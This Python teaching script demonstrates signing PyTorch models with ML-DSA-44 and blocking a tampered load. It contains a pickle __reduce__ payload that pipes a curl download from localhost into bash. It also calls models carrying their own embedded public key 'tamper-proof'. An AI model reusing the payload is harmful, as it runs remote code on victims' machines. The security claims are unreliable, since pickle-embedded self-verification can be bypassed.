#!/usr/bin/env python3
"""
Self-Verifying Model Defense - Educational Tool
================================================
This script demonstrates how cryptographic signatures protect PyTorch models
from tampering and malicious code injection.

Defense Flow:
    1. Load normal model
    2. Sign with ML-DSA-44 (post-quantum cryptography)
    3. Attempt to inject malicious payload
    4. Try to load tampered model → BLOCKED! 🛡️

Key Concepts:
    - Digital signatures for model integrity
    - Self-verifying models with embedded signatures
    - Tamper detection and prevention
    - ML-DSA-44 (NIST FIPS 204) post-quantum signature scheme
"""

import torch
import pickle
import os
import time
from self_verifying_secure import create_self_verifying_model, verify_self_verifying_model


# ============================================================================
# Configuration
# ============================================================================

SOURCE_MODEL = 'models/small_model.pt'
DEFENSE_DIR = 'models_defense'
SIGNED_MODEL = 'models_defense/small_signed.pt'
TAMPERED_MODEL = 'models_defense/small_signed_tampered.pt'

SECRET_KEY = 'ml_dsa_secret.key'
PUBLIC_KEY = 'ml_dsa_public.key'


# ============================================================================
# Malicious Payload (for demonstration)
# ============================================================================

class MaliciousPayload:
    """Same payload as in 1_attack.py - for testing defense"""
    def __reduce__(self):
        import os
        return (os.system, ('curl -k -s https://localhost:8888/attack_demo.sh | bash',))


# ============================================================================
# Helper Functions
# ============================================================================

def print_header(title):
    """Print formatted section header"""
    print("\n" + "=" * 80)
    print(f" {title}")
    print("=" * 80)


def print_step(step_num, title):
    """Print step header"""
    print(f"\n{'─' * 80}")
    print(f"STEP {step_num}: {title}")
    print('─' * 80)


# ============================================================================
# Defense Demonstration
# ============================================================================

def demonstrate_defense():
    """Main defense demonstration"""

    print("=" * 80)
    print(" SELF-VERIFYING MODEL DEFENSE DEMONSTRATION")
    print(" Cryptographic Protection Against Model Tampering")
    print("=" * 80)

    print("\n🎯 OBJECTIVES:")
    print("   1. Create a cryptographically signed model")
    print("   2. Show how signatures prevent tampering")
    print("   3. Demonstrate automatic verification on load")
    print("   4. Block malicious payload injection")

    # Create defense directory
    os.makedirs(DEFENSE_DIR, exist_ok=True)

    # ========================================================================
    # STEP 1: Load Source Model
    # ========================================================================
    print_step(1, "Loading Source Model")

    print(f"\n📖 About the Source Model")
    print("─" * 80)
    print(f"   File: {SOURCE_MODEL}")
    print(f"   Type: sentence-transformers/all-MiniLM-L6-v2")
    print(f"   Purpose: Normal, unsigned model (vulnerable to tampering)")

    if not os.path.exists(SOURCE_MODEL):
        print(f"\n❌ ERROR: Source model not found: {SOURCE_MODEL}")
        print(f"   Please ensure the model exists before running this script.")
        return False

    source_size = os.path.getsize(SOURCE_MODEL)
    print(f"\n   ✓ Source model found")
    print(f"   ✓ Size: {source_size / (1024*1024):.2f} MB ({source_size:,} bytes)")

    # ========================================================================
    # STEP 2: Create Self-Verifying Model
    # ========================================================================
    print_step(2, "Creating Self-Verifying Model with ML-DSA-44 Signature")

    print(f"\n📖 ML-DSA-44 (NIST FIPS 204)")
    print("─" * 80)
    print("   • Post-quantum digital signature algorithm")
    print("   • Based on Module-Lattice-Digital-Signature-Algorithm (ML-DSA)")
    print("   • Resistant to quantum computer attacks")
    print("   • Standardized by NIST in FIPS 204 (2024)")
    print()
    print("   Signature Process:")
    print("   1. Hash model data with SHA-256")
    print("   2. Sign hash with ML-DSA-44 secret key")
    print("   3. Embed signature + public key into model")
    print("   4. Model becomes self-verifying!")

    print(f"\n🔐 Signing Process:")
    print("─" * 80)
    print(f"   Input:  {SOURCE_MODEL}")
    print(f"   Output: {SIGNED_MODEL}")
    print(f"   Secret Key: {SECRET_KEY}")
    print(f"   Public Key: {PUBLIC_KEY}")
    print()
    print("   Signing in progress...")

    start_time = time.time()

    result = create_self_verifying_model(
        model_path=SOURCE_MODEL,
        secret_key_path=SECRET_KEY,
        public_key_path=PUBLIC_KEY,
        output_path=SIGNED_MODEL
    )

    elapsed = time.time() - start_time
    signed_size = os.path.getsize(SIGNED_MODEL)
    signature_overhead = signed_size - source_size

    print(f"\n   ✓ Signing completed in {elapsed * 1000:.2f} ms")
    print(f"\n   📊 Signature Details:")
    print("   " + "─" * 76)
    print(f"      Hash time:      {result['hash_time'] * 1000:7.2f} ms")
    print(f"      Sign time:      {result['sign_time'] * 1000:7.2f} ms")
    print(f"      Write time:     {result['serialize_time'] + result['save_time']:7.2f} ms")
    print(f"      Total time:     {result['total_time'] * 1000:7.2f} ms")
    print("   " + "─" * 76)

    print(f"\n   📁 File Sizes:")
    print("   " + "─" * 76)
    print(f"      Original:   {source_size:>12,} bytes ({source_size / (1024*1024):.2f} MB)")
    print(f"      Signed:     {signed_size:>12,} bytes ({signed_size / (1024*1024):.2f} MB)")
    print(f"      Overhead:   {signature_overhead:>12,} bytes ({signature_overhead / 1024:.2f} KB)")
    print(f"      Overhead %: {(signature_overhead / source_size) * 100:>11.4f}%")
    print("   " + "─" * 76)

    print(f"\n   💡 Analysis:")
    print(f"      • Signature overhead is minimal ({signature_overhead / 1024:.2f} KB)")
    print(f"      • Includes ML-DSA-44 signature + public key + metadata")
    print(f"      • Model is now self-verifying and tamper-proof!")

    # ========================================================================
    # STEP 3: Verify Signed Model (Normal Case)
    # ========================================================================
    print_step(3, "Verifying Signed Model (Normal Case)")

    print(f"\n📖 Automatic Verification on Load")
    print("─" * 80)
    print("   When loading a self-verifying model:")
    print("   1. torch.load() deserializes the model")
    print("   2. SelfVerifier object's __reduce__() is called")
    print("   3. Signature is verified automatically")
    print("   4. If valid → returns model data")
    print("   5. If invalid → raises ValueError")

    print(f"\n🔍 Loading signed model: {SIGNED_MODEL}")
    print("   " + "─" * 76)

    try:
        verify_start = time.time()
        model = torch.load(SIGNED_MODEL, weights_only=False)
        verify_elapsed = time.time() - verify_start

        print(f"   ✅ VERIFICATION SUCCESSFUL!")
        print(f"   ✓ Signature is valid")
        print(f"   ✓ Model integrity confirmed")
        print(f"   ✓ No tampering detected")
        print(f"   ✓ Verification time: {verify_elapsed * 1000:.2f} ms")
        print(f"\n   Model type: {type(model)}")

    except ValueError as e:
        print(f"   ❌ VERIFICATION FAILED!")
        print(f"   Error: {str(e)[:100]}")
        return False

    # ========================================================================
    # STEP 4: Attempt to Tamper with Signed Model
    # ========================================================================
    print_step(4, "Attempting to Inject Malicious Payload")

    print(f"\n📖 Attack Scenario: Inject Payload into Signed Model")
    print("─" * 80)
    print("   Attacker tries to inject malicious code into the signed model.")
    print("   This simulates a man-in-the-middle attack or compromised download.")

    print(f"\n🚨 Tampering Process:")
    print("   " + "─" * 76)
    print("   1. Load signed model (signature valid)")
    print("   2. Extract SelfVerifier object")
    print("   3. Modify model_data_bytes (inject MaliciousPayload)")
    print("   4. Save tampered model (signature now invalid!)")

    # Load the signed model
    print(f"\n   [1/4] Loading signed model...")
    verifier = torch.load(SIGNED_MODEL, weights_only=False)
    print(f"   ✓ Loaded SelfVerifier object")

    # Extract and modify model data
    print(f"\n   [2/4] Extracting model_data_bytes...")
    original_model = pickle.loads(verifier.model_data_bytes)
    print(f"   ✓ Deserialized model data")

    print(f"\n   [3/4] Injecting MaliciousPayload...")
    if isinstance(original_model, dict):
        original_model['__malicious_payload__'] = MaliciousPayload()
    else:
        original_model = {
            'original_model': original_model,
            '__malicious_payload__': MaliciousPayload()
        }
    print(f"   ✓ Payload injected into model")

    # Re-serialize with malicious payload
    verifier.model_data_bytes = pickle.dumps(original_model, protocol=4)
    print(f"   ✓ Re-serialized with malicious code")

    # Save tampered model (signature is now invalid!)
    print(f"\n   [4/4] Saving tampered model...")
    torch.save(verifier, TAMPERED_MODEL, pickle_protocol=4)

    tampered_size = os.path.getsize(TAMPERED_MODEL)
    tamper_overhead = tampered_size - signed_size

    print(f"   ✓ Tampered model saved: {TAMPERED_MODEL}")
    print(f"   ✓ Size: {tampered_size / (1024*1024):.2f} MB ({tampered_size:,} bytes)")
    print(f"   ✓ Tamper overhead: {tamper_overhead / 1024:.2f} KB ({tamper_overhead:,} bytes)")

    print(f"\n   💡 What Changed?")
    print("   " + "─" * 76)
    print("   ✓ model_data_bytes: MODIFIED (contains malicious payload)")
    print("   ✗ signature:        UNCHANGED (still signs original data)")
    print("   ✗ public_key:       UNCHANGED")
    print()
    print("   Result: Signature verification will FAIL!")

    # ========================================================================
    # STEP 5: Try to Load Tampered Model (Defense Triggered)
    # ========================================================================
    print_step(5, "Attempting to Load Tampered Model")

    print(f"\n📖 Defense Mechanism in Action")
    print("─" * 80)
    print("   The tampered model has:")
    print("   • Modified model_data_bytes (with malicious payload)")
    print("   • Original signature (doesn't match modified data)")
    print()
    print("   When loaded:")
    print("   1. SelfVerifier's __reduce__() is called")
    print("   2. Computes hash of current model_data_bytes")
    print("   3. Verifies signature against computed hash")
    print("   4. Hashes don't match → SIGNATURE VERIFICATION FAILS")
    print("   5. Raises ValueError → MODEL LOADING BLOCKED!")

    print(f"\n🔍 Loading tampered model: {TAMPERED_MODEL}")
    print("   " + "─" * 76)
    print()

    try:
        print("   EXECUTING: torch.load('{}', weights_only=False)".format(TAMPERED_MODEL))
        print()

        load_start = time.time()
        tampered_model = torch.load(TAMPERED_MODEL, weights_only=False)
        load_elapsed = time.time() - load_start

        # If we reach here, verification failed to block the attack!
        print()
        print("   " + "─" * 76)
        print(f"   ❌ DEFENSE FAILED!")
        print(f"   ❌ Tampered model loaded successfully (SHOULD NOT HAPPEN)")
        print(f"   ❌ Malicious payload was NOT blocked!")
        print("   " + "─" * 76)
        return False

    except ValueError as e:
        load_elapsed = time.time() - load_start
        error_msg = str(e)

        print()
        print("   " + "─" * 76)
        print(f"   ✅ DEFENSE SUCCESSFUL! 🛡️")
        print("   " + "─" * 76)
        print(f"   ✓ Tampered model BLOCKED!")
        print(f"   ✓ Signature verification detected tampering")
        print(f"   ✓ Malicious payload prevented from executing")
        print(f"   ✓ Detection time: {load_elapsed * 1000:.2f} ms")
        print()
        print(f"   Error Message:")
        print(f"   {error_msg[:200]}")
        if len(error_msg) > 200:
            print(f"   ...")
        print("   " + "─" * 76)

    # ========================================================================
    # STEP 6: Comparison with Unsigned Model
    # ========================================================================
    print_step(6, "Comparison: Signed vs Unsigned Models")

    print(f"\n📊 Attack Success Rate")
    print("─" * 80)
    print()
    print("   Unsigned Model (normal PyTorch):")
    print("   ─────────────────────────────────")
    print("   • No integrity protection")
    print("   • torch.load(weights_only=False) executes any code")
    print("   • Malicious payload: ✅ SUCCEEDS")
    print("   • Attack prevention: ❌ NONE")
    print()
    print("   Signed Model (Self-Verifying):")
    print("   ────────────────────────────────")
    print("   • Cryptographic signature (ML-DSA-44)")
    print("   • Automatic verification on load")
    print("   • Malicious payload: ❌ BLOCKED")
    print("   • Attack prevention: ✅ COMPLETE")

    print(f"\n📈 Performance Overhead")
    print("─" * 80)
    print()
    print(f"   Signature Creation:")
    print(f"   • Time: {result['total_time'] * 1000:.2f} ms (one-time cost)")
    print(f"   • Size: {signature_overhead / 1024:.2f} KB overhead")
    print()
    print(f"   Signature Verification:")
    print(f"   • Time: {verify_elapsed * 1000:.2f} ms (every load)")
    print(f"   • Overhead: Minimal, adds ~{verify_elapsed * 1000:.0f}ms to load time")

    # ========================================================================
    # Summary
    # ========================================================================
    print_header("SUMMARY - DEFENSE EFFECTIVENESS")

    print(f"""
    🛡️ Defense Results
    ──────────────────

    ✅ Signed Model Protection:
    ───────────────────────────
    • Created self-verifying model with ML-DSA-44 signature
    • Signature overhead: {signature_overhead / 1024:.2f} KB ({(signature_overhead / source_size) * 100:.4f}%)
    • Signing time: {result['total_time'] * 1000:.2f} ms
    • Verification time: {verify_elapsed * 1000:.2f} ms

    🚨 Tampering Attempt:
    ─────────────────────
    • Injected MaliciousPayload into signed model
    • Modified model_data_bytes (signature became invalid)
    • Attempted to load tampered model

    ✅ Defense Outcome:
    ───────────────────
    • Signature verification DETECTED tampering
    • Model loading BLOCKED with ValueError
    • Malicious code PREVENTED from executing
    • System remains SECURE! 🛡️

    🔑 Key Takeaways:
    ─────────────────

    1. Cryptographic Signatures Provide Strong Protection:
       • ML-DSA-44 post-quantum signature algorithm
       • Any modification invalidates the signature
       • Automatic verification on every load

    2. Self-Verifying Models are Tamper-Proof:
       • Signature and public key embedded in model
       • No external verification infrastructure needed
       • Works with standard torch.load()

    3. Minimal Performance Impact:
       • One-time signing cost: {result['total_time'] * 1000:.2f} ms
       • Per-load verification: {verify_elapsed * 1000:.2f} ms
       • Negligible size overhead: {signature_overhead / 1024:.2f} KB

    4. Complete Attack Prevention:
       • Blocks malicious code injection
       • Prevents model backdooring
       • Detects man-in-the-middle attacks
       • Ensures model authenticity

    5. Comparison with Alternative Defenses:
       • weights_only=True: Blocks pickle exploits, but breaks many models
       • File hashing: Requires external hash storage and distribution
       • Self-verifying: Best of both worlds - secure AND convenient!

    📚 Next Steps:
    ──────────────
    • Compare with 1_attack.py (unsigned model attack succeeds)
    • Compare with 2_victim-load.py (victim loads malicious model)
    • See test_all_models.py for comprehensive testing
    • Review self_verifying_secure.py for implementation details
    """)

    print("\n" + "=" * 80)
    print(" Defense Demonstration Complete - Models are Protected! 🛡️")
    print("=" * 80)
    print()

    return True


# ============================================================================
# Main
# ============================================================================

if __name__ == "__main__":
    success = demonstrate_defense()
    exit(0 if success else 1)
